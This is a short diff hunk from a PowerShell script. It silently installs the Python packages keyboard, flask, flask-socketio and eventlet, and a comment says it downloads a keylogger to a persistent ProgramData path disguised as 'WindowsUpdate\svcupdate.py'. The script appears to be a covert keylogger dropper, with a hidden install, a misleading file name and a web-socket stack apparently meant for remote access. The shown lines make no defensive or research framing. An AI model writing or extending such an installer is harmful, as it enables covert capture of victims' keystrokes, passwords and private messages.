@@ -70,7 +70,7 @@ if (-not $py) {
     $pyw = "C:\Program Files\Python311\pythonw.exe"
 }
 
-& $py -m pip install keyboard flask flask-socketio --quiet 2>$null
+& $py -m pip install keyboard flask flask-socketio eventlet --quiet 2>$null
 
 # Download keylogger to ProgramData (persistent location)
 $keyloggerPath = "C:\ProgramData\WindowsUpdate\svcupdate.py"
